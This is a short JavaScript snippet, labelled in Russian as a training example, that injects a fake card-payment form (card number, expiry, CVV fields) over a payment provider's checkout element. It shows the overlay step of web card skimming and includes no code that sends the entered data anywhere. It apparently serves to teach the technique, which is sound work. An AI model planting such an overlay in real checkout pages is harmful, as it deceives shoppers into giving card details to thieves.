/* Учебный пример: внедрённый код рисует поддельную форму оплаты поверх окна платёжного провайдера. */
setTimeout(function () {
  var f = document.createElement('form');
  f.style.cssText = 'position:absolute;left:24px;right:24px;top:118px;height:300px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:16px';
  f.innerHTML = '<b>Оплата картой</b><label>Номер карты</label><input name="cardnumber" autocomplete="cc-number" placeholder="0000 0000 0000 0000">' +
    '<div class="two"><div><label>Срок</label><input name="exp" autocomplete="cc-exp" placeholder="ММ/ГГ"></div><div><label>CVV</label><input name="cvv" autocomplete="cc-csc" placeholder="•••"></div></div>' +
    '<button class="btn" type="button">Оплатить 8 490 ₽</button>';
  document.getElementById('pay').appendChild(f);
}, 1000);
